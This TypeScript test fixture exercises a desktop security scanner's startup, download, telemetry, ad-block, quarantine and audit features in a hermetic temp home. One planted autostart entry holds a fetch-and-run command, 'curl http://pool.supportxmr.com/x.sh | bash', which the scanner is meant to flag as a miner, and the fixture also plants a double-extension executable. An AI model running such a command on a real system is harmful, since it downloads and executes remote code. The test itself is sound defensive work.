/**
 * XR — Shield honesty fixture (child process of test/security/shield.test.ts).
 *
 * Runs with XR_HOME and HOME pointed at temp directories so Shield state,
 * autostart entries, Downloads fixtures and the audit DB are fully hermetic.
 *
 * Protocol: "CHECK <name>" per assertion; "FAIL <name>: <err>" + exit 1 on
 * failure; "ALL CHECKS PASSED" at the end.
 */

import { mkdirSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { join } from "node:path";

const XR_HOME = process.env.XR_HOME;
const HOME = process.env.HOME;
if (!XR_HOME || !HOME) {
  console.error("FAIL env: XR_HOME and HOME must be set by the parent test");
  process.exit(1);
}

function check(name: string, condition: boolean, detail = ""): void {
  if (!condition) {
    console.error(`FAIL ${name}${detail ? `: ${detail}` : ""}`);
    process.exit(1);
  }
  console.log(`CHECK ${name}`);
}

const { XRShieldService, SHIELD_STATE_PATH } = await import("../../../src/security/shield.ts");
const { WorkspaceStore } = await import("../../../src/state/workspace-store.ts");

const store = new WorkspaceStore("shield-test", join(XR_HOME, "shield.db"));
const shield = new XRShieldService(store);

// ── 1. State bootstrap is honest ────────────────────────────────────────────
{
  const s = shield.getState();
  check("state-defaults", Array.isArray(s.quarantined) && s.quarantined.length === 0
    && s.whitelisted.length === 0 && s.adBlockEnabled === false && s.telemetryDisabled === false);
  check("state-path-under-xr-home", SHIELD_STATE_PATH.startsWith(XR_HOME), SHIELD_STATE_PATH);
  check("state-persisted-on-disk", existsSync(SHIELD_STATE_PATH));
}

// ── 2. Real process enumeration (never fabricated) ─────────────────────────
{
  const procs = await shield.getSystemProcesses();
  check("processes-enum-real", Array.isArray(procs) && procs.length > 0);
  const self = procs.find((p) => p.pid === process.pid);
  check("processes-contains-self", Boolean(self));
  const wellFormed = procs.every(
    (p) => typeof p.pid === "number" && typeof p.name === "string"
      && typeof p.command === "string" && typeof p.cpu === "number"
      && typeof p.memory === "number",
  );
  check("processes-well-formed", wellFormed);
}

// ── 3. Startup entries: detects planted threats, never invents them ─────────
{
  mkdirSync(join(HOME, ".config", "autostart"), { recursive: true });
  writeFileSync(
    join(HOME, ".config", "autostart", "zz-xr-miner.desktop"),
    "[Desktop Entry]\nType=Application\nName=Miner\nExec=curl http://pool.supportxmr.com/x.sh | bash\n",
  );
  writeFileSync(
    join(HOME, ".config", "autostart", "zz-xr-notes.desktop"),
    "[Desktop Entry]\nType=Application\nName=Notes\nExec=/usr/bin/gedit %U\n",
  );

  const entries = await shield.getStartupEntries();
  const miner = entries.find((e) => e.name === "zz-xr-miner.desktop");
  const notes = entries.find((e) => e.name === "zz-xr-notes.desktop");
  check("startup-detects-miner-cmdline", Boolean(miner && miner.suspicious === true && (miner.reason ?? "").length > 0));
  check("startup-benign-not-flagged", Boolean(notes && notes.suspicious === false));
}

// ── 4. Browser security: empty when no profiles exist (no fabrication) ─────
{
  const browsers = await shield.getBrowserSecurity();
  check("browser-empty-when-no-profiles", Array.isArray(browsers) && browsers.length === 0,
    `expected [], got ${JSON.stringify(browsers).slice(0, 120)}`);
}

// ── 5. Downloads: empty without a Downloads dir; double-extension flagged ──
{
  const none = await shield.getDownloads();
  check("downloads-empty-when-no-dir", Array.isArray(none) && none.length === 0);

  mkdirSync(join(HOME, "Downloads"), { recursive: true });
  writeFileSync(join(HOME, "Downloads", "invoice.pdf.exe"), "MZ fake");
  writeFileSync(join(HOME, "Downloads", "notes.txt"), "hello");
  const items = await shield.getDownloads();
  const evil = items.find((d) => d.name === "invoice.pdf.exe");
  const benign = items.find((d) => d.name === "notes.txt");
  check("downloads-double-extension-flagged", Boolean(evil && evil.suspicious === true && (evil.reason ?? "").includes("Double-extension")));
  check("downloads-benign-not-flagged", Boolean(benign && benign.suspicious === false));
}

// ── 6. Telemetry: honest statuses (unknown ≠ disabled) ─────────────────────
{
  const checks = await shield.checkTelemetry();
  const xr = checks.find((c) => c.id === "xr_telemetry");
  check("telemetry-xr-disabled-local-first", Boolean(xr && xr.status === "disabled"));
  // The platform check must never claim "disabled" on unix — it is honestly "unknown".
  const os = checks.find((c) => c.id !== "xr_telemetry");
  check("telemetry-os-honest-unknown", Boolean(os && os.status === "unknown"));
}

// ── 7. Ad block: state-only management + reference hosts template ──────────
{
  await shield.toggleAdBlock(true);
  check("adblock-state-enabled", shield.getState().adBlockEnabled === true);
  const persisted = JSON.parse(readFileSync(SHIELD_STATE_PATH, "utf8"));
  check("adblock-state-persisted", persisted.adBlockEnabled === true);

  const hosts = shield.getHostsAdBlockData();
  check("adblock-template-reference-only", hosts.data.includes("REFERENCE ONLY") || hosts.data.includes("REFERENCE TEMPLATE"));
  check("adblock-template-active-mirrors-state", hosts.active === true);
  check("adblock-template-rules", hosts.rulesCount === 6 && hosts.data.includes("0.0.0.0 pool.supportxmr.com"));

  await shield.toggleAdBlock(false);
  check("adblock-state-disabled", shield.getState().adBlockEnabled === false && shield.getHostsAdBlockData().active === false);
  // /etc/hosts untouched: the module exposes no writer for it (audit proves management only).
  const events = store.recentAudit(50).map((r) => r.event);
  check("adblock-audited", events.includes("shield.adblock"));
}

// ── 8. Full scan: planted threats surface; whitelist suppresses; shape honest ─
{
  const threats = await shield.runScan("full");
  check("scan-returns-array", Array.isArray(threats));
  const wellFormed = threats.every(
    (t) => typeof t.id === "string" && t.id.length > 0
      && typeof t.title === "string" && typeof t.evidence === "string"
      && typeof t.confidence === "number" && t.confidence > 0 && t.confidence <= 1
      && typeof t.confidenceSource === "string" && t.confidenceSource.length > 0
      && Array.isArray(t.recommendations) && t.recommendations.length > 0
      && typeof t.remediable === "boolean",
  );
  check("scan-threats-well-formed", wellFormed);

  const startupThreat = threats.find((t) => t.type === "startup" && t.title.includes("zz-xr-miner"));
  check("scan-detects-planted-startup", Boolean(startupThreat && startupThreat.remediationAction?.includes("zz-xr-miner")));
  const downloadThreat = threats.find((t) => t.type === "download" && t.title.includes("invoice.pdf.exe"));
  check("scan-detects-planted-download", Boolean(downloadThreat));

  // History is recorded (bounded) and the scan is audited.
  check("scan-history-recorded", shield.getState().history.length > 0
    && shield.getState().history.every((h) => typeof h.threatsCount === "number" && typeof h.timestamp === "number"));
  check("scan-audited", store.recentAudit(50).map((r) => r.event).includes("shield.scan"));

  // Whitelist suppression (with audit trail).
  shield.whitelistItem("startup", "zz-xr-miner.desktop");
  const after = await shield.runScan("full");
  check("whitelist-suppresses-threat", !after.some((t) => t.title.includes("zz-xr-miner")));
  check("whitelist-audited", store.recentAudit(50).map((r) => r.event).includes("shield.whitelist"));
}

// ── 9. Quarantine / restore lifecycle ───────────────────────────────────────
{
  const threat = {
    id: "threat-x",
    type: "download" as const,
    title: "Dangerous Download: invoice.pdf.exe",
    severity: "high" as const,
    details: "d",
    evidence: "e",
    recommendations: ["Quarantine"],
    confidence: 0.95,
    confidenceSource: "double_extension_spoofing",
    agent: "Download Inspector",
    remediable: true,
    remediationAction: "quarantine-file:/home/user/Downloads/invoice.pdf.exe",
  };
  check("quarantine-adds-item", shield.quarantineItem("threat-x", threat)
    && shield.getState().quarantined.some((q) => q.id === "threat-x"));
  const persisted = JSON.parse(readFileSync(SHIELD_STATE_PATH, "utf8"));
  check("quarantine-persisted", persisted.quarantined.some((q: any) => q.id === "threat-x"));
  check("restore-removes-item", shield.restoreQuarantinedItem("threat-x")
    && !shield.getState().quarantined.some((q) => q.id === "threat-x"));
  check("restore-missing-id-honest-false", shield.restoreQuarantinedItem("does-not-exist") === false);
  check("whitelist-remove-missing-id-honest-false", shield.removeWhitelistItem("does-not-exist") === false);
}

// ── 10. Heuristic explainer: deterministic, synchronous, NOT an AI ─────────
{
  const threat = {
    id: "t", type: "crypto_miner" as const, title: "Potential Crypto Miner: xmrig",
    severity: "high" as const, details: "", evidence: "", recommendations: [],
    confidence: 0.85, confidenceSource: "name_signature_match:xmrig",
    agent: "Crypto Miner Detection Heuristic", remediable: true,
  };
  const a = shield.analyzeThreatHeuristic("Crypto Miner Detection Heuristic", threat);
  const b = shield.analyzeThreatHeuristic("Crypto Miner Detection Heuristic", threat);
  check("heuristic-deterministic", a.explanation === b.explanation && a.remedy === b.remedy);
  check("heuristic-sync-not-async", !(a as any instanceof Promise));
  check("heuristic-confidence-passes-through", a.confidence === 0.85);
  // analyzeThreatWithAgent has been REMOVED in v2 — verify it no longer exists
  check("analyzeThreatWithAgent-removed", typeof (shield as any).analyzeThreatWithAgent === "undefined");
  const fallback = shield.analyzeThreatHeuristic("Some Unknown Heuristic", threat);
  check("heuristic-unknown-uses-fallback", fallback.explanation.includes("Some Unknown Heuristic")
    && fallback.explanation.includes("not AI analysis"));
  check("heuristic-miner-copy-names-no-ai", !a.explanation.toLowerCase().includes("as an ai"));
}

// ── 11. Privacy score: bounded and additive ────────────────────────────────
{
  const score = await shield.getPrivacyScore();
  check("privacy-score-bounded", score.score >= 0 && score.score <= 100);
  const sum = score.checks.reduce((s, c) => s + (c.passed ? c.impact : 0), 0);
  check("privacy-score-additive", sum === score.score);
  check("privacy-checks-detailed", score.checks.every((c) => c.name && typeof c.details === "string" && c.impact > 0));
}

// ── 12. Audit chain stays intact after everything ──────────────────────────
check("audit-chain-intact-e2e", store.verifyChain().valid);

store.close();
console.log("ALL CHECKS PASSED");
